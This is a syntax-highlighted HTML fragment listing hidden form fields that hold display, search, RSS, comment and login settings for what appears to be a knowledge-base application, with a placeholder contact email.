      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;tree&amp;#95;width"</span> <span class="na">value=</span><span class="s">"3"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"sidebar&amp;#95;orientation"</span> <span class="na">value=</span><span class="s">"left"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;tree&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"normal"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;tree&amp;#95;articles"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;articles&amp;#95;count"</span> <span class="na">value=</span><span class="s">"show"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"categories&amp;#95;display&amp;#95;order"</span> <span class="na">value=</span><span class="s">"Alphabetic"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"home&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"modern"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"home&amp;#95;search&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"categories&amp;#95;layout&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"theme1"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;categories&amp;#95;cols"</span> <span class="na">value=</span><span class="s">"4"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;title&amp;#95;size"</span> <span class="na">value=</span><span class="s">"normal"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"home&amp;#95;articles&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"tabbed"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;featured"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"featured&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;popular"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"popular&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;rated"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"rated&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;recent"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"recent&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;subscribe&amp;#95;kb"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;subscribe&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"minimal"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;articles&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;page&amp;#95;records&amp;#95;default"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;page&amp;#95;records&amp;#95;minimal"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"articles&amp;#95;sortby"</span> <span class="na">value=</span><span class="s">"Popularity"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"articles&amp;#95;sortorder"</span> <span class="na">value=</span><span class="s">"Descending"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;subscribe&amp;#95;category"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;news&amp;#95;page"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;homepage&amp;#95;news"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"number&amp;#95;homepage&amp;#95;news"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;login&amp;#95;page"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;glossary&amp;#95;page"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;contact&amp;#95;page"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"send&amp;#95;contact&amp;#95;email"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"contact&amp;#95;email&amp;#95;address"</span> <span class="na">value=</span><span class="s">"hey.do.not.try.to.grab.my.information@justjoking.it"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;instant&amp;#95;suggestions"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"minimum&amp;#95;question&amp;#95;characters"</span> <span class="na">value=</span><span class="s">"60"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"default&amp;#95;search"</span> <span class="na">value=</span><span class="s">"Articles"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"search&amp;#95;in&amp;#95;articles"</span> <span class="na">value=</span><span class="s">"All"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"search&amp;#95;in&amp;#95;others"</span> <span class="na">value=</span><span class="s">"Both"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"search&amp;#95;filter"</span> <span class="na">value=</span><span class="s">"Any&amp;#32;Word"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;recentviewed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"recentviewed&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;popular&amp;#95;searches"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"popularsearch&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"article&amp;#95;page&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"article&amp;#95;sidebar&amp;#95;content"</span> <span class="na">value=</span><span class="s">"related"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;add&amp;#95;favorite"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;print&amp;#95;article"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;email&amp;#95;article"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;exportto&amp;#95;msword"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;exportto&amp;#95;pdf"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;subscribe&amp;#95;article"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;custom&amp;#95;fields"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;rating"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;hits"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;author"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;author&amp;#95;email"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;related&amp;#95;articles"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"number&amp;#95;related&amp;#95;articles"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;related&amp;#95;articles&amp;#95;randomly"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;feedback"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;comments"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"existing&amp;#95;comments&amp;#95;visibility"</span> <span class="na">value=</span><span class="s">"hide"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;comments&amp;#95;to"</span> <span class="na">value=</span><span class="s">"all"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"comments&amp;#95;sortorder"</span> <span class="na">value=</span><span class="s">"Descending"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email&amp;#95;privacy&amp;#95;protection"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"article&amp;#95;meta&amp;#95;source"</span> <span class="na">value=</span><span class="s">"article&amp;#32;title"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"notify&amp;#95;pending&amp;#95;comment&amp;#95;superuser"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"notify&amp;#95;approved&amp;#95;comment&amp;#95;user"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"schema&amp;#95;publisher&amp;#95;name"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"schema&amp;#95;publisher&amp;#95;logo"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;featured&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;popular&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;latest&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;rated&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;related&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"number&amp;#95;login&amp;#95;attempts"</span> <span class="na">value=</span><span class="s">"9"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"login&amp;#95;delay"</span> <span class="na">value=</span><span class="s">"15"</span> <span class="nt">/&gt;</span>
